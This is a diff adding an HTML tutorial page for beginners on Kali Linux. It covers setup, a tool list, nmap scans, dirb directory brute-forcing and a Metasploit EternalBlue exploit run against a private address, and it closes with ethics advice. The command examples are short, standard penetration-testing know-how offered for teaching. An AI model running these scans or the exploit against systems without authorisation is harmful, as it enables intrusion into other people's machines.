@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Kali Linux Hacking Series</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    body {
+      background-color: #0d0d0d;
+      color: #00ff00;
+      font-family: 'Courier New', Courier, monospace;
+      padding: 40px;
+      line-height: 1.6;
+    }
+
+    h1, h2, h3 {
+      color: #00ff88;
+    }
+
+    a {
+      color: #00ffff;
+      text-decoration: none;
+    }
+
+    a:hover {
+      text-decoration: underline;
+    }
+
+    .section {
+      margin-bottom: 50px;
+    }
+
+    .code {
+      background: #111;
+      padding: 15px;
+      border-left: 4px solid #00ff88;
+      font-size: 0.9em;
+      white-space: pre-wrap;
+      border-radius: 5px;
+      margin-top: 10px;
+    }
+
+    .toc {
+      background: #111;
+      padding: 20px;
+      border: 1px solid #00ff88;
+      border-radius: 10px;
+      margin-bottom: 40px;
+    }
+
+    footer {
+      margin-top: 50px;
+      font-size: 0.8em;
+      color: #888;
+      text-align: center;
+      border-top: 1px dashed #00ff88;
+      padding-top: 20px;
+    }
+
+    hr {
+      border: none;
+      border-top: 1px dashed #00ff88;
+      margin: 40px 0;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>🛠 Kali Linux Hacking Series</h1>
+  <p>Learn ethical hacking step-by-step using Kali Linux. This series is designed for cybersecurity beginners and intermediate learners who want hands-on experience with real-world tools.</p>
+
+  <div class="toc">
+    <h2>📚 Table of Contents</h2>
+    <ul>
+      <li><a href="#intro">1. What is Kali Linux?</a></li>
+      <li><a href="#setup">2. Setting Up Kali Linux</a></li>
+      <li><a href="#tools">3. Essential Tools Overview</a></li>
+      <li><a href="#tutorials">4. Hacking Tutorials</a></li>
+      <li><a href="#ethics">5. Ethics & Best Practices</a></li>
+    </ul>
+  </div>
+
+  <div class="section" id="intro">
+    <h2>1. What is Kali Linux?</h2>
+    <p>Kali Linux is a Debian-based Linux distribution used by ethical hackers and penetration testers. It comes pre-installed with hundreds of security tools for testing network vulnerabilities, web applications, wireless networks, and more.</p>
+  </div>
+
+  <div class="section" id="setup">
+    <h2>2. Setting Up Kali Linux</h2>
+    <p>You can install Kali Linux on bare metal, in a virtual machine, or use a live USB. Recommended for beginners: VirtualBox or VMware.</p>
+
+    <div class="code">
+# Download Kali ISO
+https://www.kali.org/get-kali/
+
+# Update system after install
+sudo apt update && sudo apt upgrade
+
+# Install basic tools
+sudo apt install net-tools git curl build-essential
+    </div>
+  </div>
+
+  <div class="section" id="tools">
+    <h2>3. Essential Tools Overview</h2>
+    <ul>
+      <li><strong>Nmap</strong> – Network scanning and discovery</li>
+      <li><strong>Wireshark</strong> – Network protocol analyzer</li>
+      <li><strong>Metasploit</strong> – Exploit development framework</li>
+      <li><strong>Burp Suite</strong> – Web vulnerability scanner</li>
+      <li><strong>Hydra</strong> – Brute-force tool</li>
+      <li><strong>Gobuster</strong> – Directory brute-forcer</li>
+    </ul>
+  </div>
+
+  <div class="section" id="tutorials">
+    <h2>4. Hacking Tutorials</h2>
+
+    <h3>🔍 Episode 1: Scanning Networks with Nmap</h3>
+    <div class="code">
+# Basic scan
+nmap 192.168.1.1
+
+# Service and OS detection
+nmap -A target.com
+    </div>
+
+    <h3>🌐 Episode 2: Web Enumeration with Dirb</h3>
+    <div class="code">
+# Directory brute force
+dirb http://target.com
+
+# Using custom wordlist
+dirb http://target.com /usr/share/wordlists/dirb/common.txt
+    </div>
+
+    <h3>💣 Episode 3: Exploitation with Metasploit</h3>
+    <div class="code">
+# Start Metasploit
+msfconsole
+
+# Example exploit
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOST 192.168.1.5
+run
+    </div>
+  </div>
+
+  <div class="section" id="ethics">
+    <h2>5. Ethics & Best Practices</h2>
+    <ul>
+      <li>Always have permission before testing any system.</li>
+      <li>Use your skills for defensive and educational purposes.</li>
+      <li>Keep systems and tools updated.</li>
+      <li>Document your findings and follow responsible disclosure.</li>
+    </ul>
+  </div>
+
+  <hr />
+
+  <footer>
+    Built for education and ethical hacking | Host this page on GitHub Pages.<br>
+    &copy; 2025 Kali Series | Stay Legal, Stay Safe.
+  </footer>
+</body>
+</html>
